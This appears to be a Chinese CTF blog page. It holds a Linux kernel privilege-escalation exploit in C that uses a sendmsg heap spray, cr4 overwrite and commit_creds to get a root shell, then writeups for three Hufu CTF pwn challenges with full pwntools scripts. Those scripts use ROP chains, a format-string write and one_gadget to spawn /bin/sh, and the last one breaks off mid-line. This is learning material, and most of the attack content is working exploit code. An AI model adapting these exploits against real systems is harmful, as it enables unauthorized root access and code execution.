class="number">8</span>*<span class="number">12</span>);</span><br><span class="line">    input.idx=<span class="number">0</span>;</span><br><span class="line">    add(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    del(fd);</span><br><span class="line">    vmlinux_addr=input.buf[<span class="number">8</span>]<span class="number">-0x4d4680</span>;</span><br><span class="line">    <span class="keyword">size_t</span> mov_cr4_pop_ret=really_addr(<span class="number">0xffffffff81070790</span>);</span><br><span class="line">    commit_creds=really_addr(<span class="number">0xffffffff810b99d0</span>);</span><br><span class="line">    prepare_kernel_cred=really_addr(<span class="number">0xffffffff810b9d80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">96</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>=</span>&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>=</span>&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> sockfd=socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>);</span><br><span class="line">    ((<span class="keyword">size_t</span> *)buf)[<span class="number">7</span>]=<span class="number">0x6f0</span>;</span><br><span class="line">    ((<span class="keyword">size_t</span> *)buf)[<span class="number">8</span>]=mov_cr4_pop_ret;</span><br><span class="line">    addr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);</span><br><span class="line">    addr.sin_family=AF_INET;</span><br><span class="line">    addr.sin_port=htons(<span class="number">6666</span>);</span><br><span class="line">    msg.msg_control=buf;</span><br><span class="line">    msg.msg_controllen=<span class="number">96</span>;</span><br><span class="line">    msg.msg_name=(<span class="keyword">caddr_t</span>)&amp;addr;</span><br><span class="line">    msg.msg_namelen=<span class="keyword">sizeof</span>(addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++)&#123;</span><br><span class="line">        sendmsg(sockfd,&amp;msg,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cr4:%p/n&quot;</span>,mov_cr4_pop_ret);</span><br><span class="line">    show(fd);</span><br><span class="line">    ((<span class="keyword">size_t</span> *)buf)[<span class="number">8</span>]=(<span class="keyword">size_t</span>)up_power;</span><br><span class="line">    input.idx=<span class="number">1</span>;</span><br><span class="line">    add(fd);</span><br><span class="line">    del(fd);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++)&#123;</span><br><span class="line">        sendmsg(sockfd,&amp;msg,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    show(fd);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]--getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x4-5-sendmsg堆喷"><a href="#0x4-5-sendmsg堆喷" class="headerlink" title="0x4.5 sendmsg堆喷"></a>0x4.5 sendmsg堆喷</h3><p>堆喷的简单原理就是在用户态申请n多个内核堆然后然后填入数据，如果ko文件存在uaf的话那就可以利用堆喷拿到被free掉的堆修改其中的内容，进而影响程序执行。</p>
<p>sendmsg首先涉及了两个结构体<code>struct msghdr</code>和<code>struct sockaddr_in </code>首先是<code>sockaddr_in</code>记录了数据包的目的地址和端口号，然后把这个结构体的地址赋值给<code>msghdr.msg_name</code>，把这个结构体的大小赋值给<code>msghdr.msg_namelen</code>,然后把要发送的数据包的地址给<code>msg.msg_control</code>，把数据包的长度传递给<code>msg.msg_controllen</code>,最后调用sendmsg()函数，sendmsg函数的大概过程如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,</span><br><span class="line">             struct msghdr *msg_sys, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span><br><span class="line">             struct used_address *used_address,</span><br><span class="line">             <span class="keyword">unsigned</span> <span class="keyword">int</span> allowed_msghdr_flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">compat_msghdr</span> __<span class="title">user</span> *<span class="title">msg_compat</span> =</span></span><br><span class="line">        (struct compat_msghdr __user *)msg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">address</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovstack</span>[<span class="title">UIO_FASTIOV</span>], *<span class="title">iov</span> =</span> iovstack;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ctl[<span class="keyword">sizeof</span>(struct cmsghdr) + <span class="number">20</span>]</span><br><span class="line">                __aligned(<span class="keyword">sizeof</span>(<span class="keyword">__kernel_size_t</span>)); <span class="comment">// 创建44字节的栈缓冲区ctl，20是ipv6_pktinfo结构的大小</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *ctl_buf = ctl; <span class="comment">// ctl_buf指向栈缓冲区ctl</span></span><br><span class="line">    <span class="keyword">int</span> ctl_len;</span><br><span class="line">    <span class="keyword">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line">    msg_sys-&gt;msg_name = &amp;address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (MSG_CMSG_COMPAT &amp; flags)</span><br><span class="line">        err = get_compat_msghdr(msg_sys, msg_compat, <span class="literal">NULL</span>, &amp;iov);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = copy_msghdr_from_user(msg_sys, msg, <span class="literal">NULL</span>, &amp;iov); <span class="comment">// 用户数据拷贝到msg_sys，只拷贝msghdr消息头部</span></span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    err = -ENOBUFS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg_sys-&gt;msg_controllen &gt; INT_MAX) <span class="comment">//如果msg_sys小于INT_MAX，就把ctl_len赋值为用户提供的msg_controllen</span></span><br><span class="line">        <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">    flags |= (msg_sys-&gt;msg_flags &amp; allowed_msghdr_flags);</span><br><span class="line">    ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    <span class="keyword">if</span> ((MSG_CMSG_COMPAT &amp; flags) &amp;&amp; ctl_len) &#123;</span><br><span class="line">        err =</span><br><span class="line">            cmsghdr_from_user_compat_to_kern(msg_sys, sock-&gt;sk, ctl,</span><br><span class="line">                             <span class="keyword">sizeof</span>(ctl));</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">        ctl_buf = msg_sys-&gt;msg_control;</span><br><span class="line">        ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl_len) &#123;</span><br><span class="line">        BUILD_BUG_ON(<span class="keyword">sizeof</span>(struct cmsghdr) !=</span><br><span class="line">                 CMSG_ALIGN(<span class="keyword">sizeof</span>(struct cmsghdr)));</span><br><span class="line">        <span class="keyword">if</span> (ctl_len &gt; <span class="keyword">sizeof</span>(ctl)) &#123;  <span class="comment">//注意用户数据的size必须大于44字节</span></span><br><span class="line">            ctl_buf = sock_kmalloc(sock-&gt;sk, ctl_len, GFP_KERNEL);<span class="comment">//sock_kmalloc最后会调用kmalloc 分配 ctl_len 大小的堆块</span></span><br><span class="line">            <span class="keyword">if</span> (ctl_buf == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">        &#125;</span><br><span class="line">        err = -EFAULT;</span><br><span class="line">        <span class="comment">/* 注意，msg_sys-&gt;msg_control是用户可控的用户缓冲区；ctl_len是用户可控的长度。  用户数据拷贝到ctl_buf内核空间。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(ctl_buf,</span><br><span class="line">                   (<span class="keyword">void</span> __user __force *)msg_sys-&gt;msg_control,</span><br><span class="line">                   ctl_len))</span><br><span class="line">            <span class="keyword">goto</span> out_freectl;</span><br><span class="line">        msg_sys-&gt;msg_control = ctl_buf;</span><br><span class="line">    &#125;</span><br><span class="line">    msg_sys-&gt;msg_flags = flags;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>可见如果msg.msg_controllen&gt;44就会申请一个msg_controllen大小的堆块，然后把msg_control指向的数据赋值给刚申请的堆块，多次使用sendmsg就能达到堆喷的目的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/24/%E8%99%8E%E7%AC%A6ctf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/24/%E8%99%8E%E7%AC%A6ctf/" class="post-title-link" itemprop="url">虎符ctf</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-24 23:15:28 / 修改时间：23:15:55" itemprop="dateCreated datePublished" datetime="2022-03-24T23:15:28+08:00">2022-03-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="虎符ctf"><a href="#虎符ctf" class="headerlink" title="虎符ctf"></a>虎符ctf</h1><h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><p>主要难点在逆向，代码有一千多行，ida7.7能大致反编译出go的伪代码，但是伪代码中还是有很多意义不明的代码出现，再加上go的函数调用的参数放在父函数的栈上，导致ida对参数的解析比较密，不能很好的看出传入的参数是啥，只能动态调试，最后逆出了最后退出的时候会向栈上写数据且有栈溢出</p>
<p>然后中间还得玩个很复杂的游戏，主要难点就这两个了。</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000045c849: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000405b78: pop rax; ret;</span></span><br><span class="line"><span class="string">0x00000000004742da: pop rdi; xor eax, eax; mov rbp, qword ptr [rsp + 0xb0]; add rsp, 0xb8; ret;</span></span><br><span class="line"><span class="string">0x000000000045544a: pop rsi; add byte ptr [rax], al; mov byte ptr [rax], 1; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;</span></span><br><span class="line"><span class="string">0x000000000048546c: pop rdx; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">bss=<span class="number">0x538000</span>+<span class="number">0x20</span></span><br><span class="line">syscall_ret=<span class="number">0x000000000045c849</span></span><br><span class="line">pop_rax_ret=<span class="number">0x0000000000405b78</span></span><br><span class="line">rdi=<span class="number">0x00000000004742da</span></span><br><span class="line">rsi=<span class="number">0x000000000045544a</span></span><br><span class="line">rdx=<span class="number">0x000000000048546c</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;(4) EXIT&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;ARE YOU SURE?&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x48EEA0&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;YOU HAVE SEVEN CHANCES TO GUESS\n&quot;</span>)</span><br><span class="line">    guess=<span class="string">&#x27;3 2 1 0&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        sh.sendline(guess)</span><br><span class="line">        ans=sh.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;WIN&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s=<span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&#x27;guess:&#x27;</span>))</span><br><span class="line">        guess=s[<span class="number">0</span>]+<span class="string">&#x27; &#x27;</span>+s[<span class="number">1</span>]+<span class="string">&#x27; &#x27;</span>+s[<span class="number">2</span>]+<span class="string">&#x27; &#x27;</span>+s[<span class="number">3</span>]</span><br><span class="line">        <span class="built_in">print</span> guess</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;PLEASE INPUT A NUMBER:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">1717986918</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;PLEASE INPUT A NUMBER:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">305419896</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;OKAY YOU CAN LEAVE YOUR NAME AND BYE~&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    game()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;AGAIN OR EXIT?&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;e&quot;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;y&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x460</span>-<span class="number">1</span>)</span><br><span class="line">    payload+=p64(pop_rax_ret)+p64(bss)</span><br><span class="line">    payload+=p64(rsi)+p64(<span class="number">0</span>)+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">    payload+=p64(rdx)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi)+p64(<span class="number">0xc000108000</span>)+<span class="string">&#x27;d&#x27;</span>*<span class="number">0xb8</span></span><br><span class="line">    payload+=p64(pop_rax_ret)+p64(<span class="number">59</span>)+p64(syscall_ret)</span><br><span class="line">    exit(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;OKAY YOU CAN LEAVE YOUR NAME AND BYE~&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>栈溢出加格式化字符串，先通过溢出得到一个栈地址和canary,然后通过格式化字符串得到一个libc地址，爆破改返回地址为fread,不能直接改到main函数，不然标准输入输出在没有关闭的情况下会再打开一次，然后printf会报错。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000047400: pop rax; ret;</span></span><br><span class="line"><span class="string">0x0000000000023b72: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x000000000002604f: pop rsi; ret;</span></span><br><span class="line"><span class="string">0x0000000000119241: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">0x00000000000630d9: syscall; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>():</span></span><br><span class="line">    fd=<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r+&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        content=<span class="string">&quot;round &#123;0&#125;: \n&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(content)</span><br><span class="line">        sh.sendline(fd.read(<span class="number">1</span>))</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot; b *(0x7ffff7fc6000+0x1565)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x108</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">    sh.sendafter(<span class="string">&quot;Please input your name:\n&quot;</span>,payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line">    canary=u64(sh.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">    stack_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(stack_addr)</span><br><span class="line">    game()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Good luck to you.&quot;</span>)</span><br><span class="line">    fmt=<span class="string">&#x27;%3$p&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x74Aa</span>-<span class="number">0xe</span>)+<span class="string">&#x27;c%8$hn&#x27;</span>+p64(stack_addr-<span class="number">0x210</span>)</span><br><span class="line">    <span class="comment"># print len(&#x27;%3$p&#x27;+&#x27;%&#x27;+str(0x7465-0xe)+&#x27;c%8$hn&#x27;)</span></span><br><span class="line">    sh.send(fmt)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    s=sh.recvline()</span><br><span class="line">    m=sh.recv()</span><br><span class="line">    libc_addr=<span class="built_in">int</span>(m[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)-<span class="number">0x10e002</span></span><br><span class="line">    pop_rax=libc_addr+<span class="number">0x0000000000047400</span></span><br><span class="line">    pop_rdi=libc_addr+<span class="number">0x0000000000023b72</span></span><br><span class="line">    pop_rsi=libc_addr+<span class="number">0x000000000002604f</span></span><br><span class="line">    pop_rdx_r12=libc_addr+<span class="number">0x0000000000119241</span></span><br><span class="line">    syscall=libc_addr+<span class="number">0x00000000000630d9</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please input your name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">59</span>)+p64(pop_rdi)+p64(stack_addr-<span class="number">0x208</span>)+p64(pop_rsi)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(pop_rdx_r12)+<span class="number">2</span>*p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;2. paper&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;12345&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h2><p>第一次做vm题，这个应该算是比较简单的vm题，程序虚拟了几个指令集，包括<code>push,pop,add sub mov xor add or</code>等，然后还虚拟了六个寄存器 ，每次读取四个字节，第一个字节是指令码，比如add是<code>\x02</code>,第二个字节是目的寄存器，第三第四个寄存器是操作数比如<code>\x02\x00\x01\x02</code>就是把第二个寄存器的数和第0个寄存器的数相加然后赋值给第一个寄存器。</p>
<p>漏洞就出在对边界的检查不规范导致了内存写和内存读。</p>
<p>正常有六个寄存器，选项1是对单个寄存器进行赋值，选项2,3,4,5,6,7是对寄存器进行计算，选项9是<br>入栈操作，这个可以利用v9完成返回地址写，选项a是出栈操作，可以利用v9进行返回地址的读。选项d可以进行一个<br>小范围的读，选项e可以进行小范围的读，选项e可以进行小范围的写，通过这个改写v9。</p>
<p>通过上面的几个漏洞的组合就能getshell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./mva&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe6c7e execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c81 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c84 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=<span class="number">0xe6c81</span></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;b *(0x7ffff7fc6000+0x1A62)&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;[+] Welcome to MVA, input your code now :&quot;</span>)</span><br><span class="line">addr_offset=<span class="number">0x270b3</span></span><br><span class="line">pay=<span class="string">&#x27;\x01\x00\x01\x0f&#x27;</span><span class="comment">#s0=0x110</span></span><br><span class="line">pay+=<span class="string">&#x27;\x0e\x00\xf6\x00&#x27;</span><span 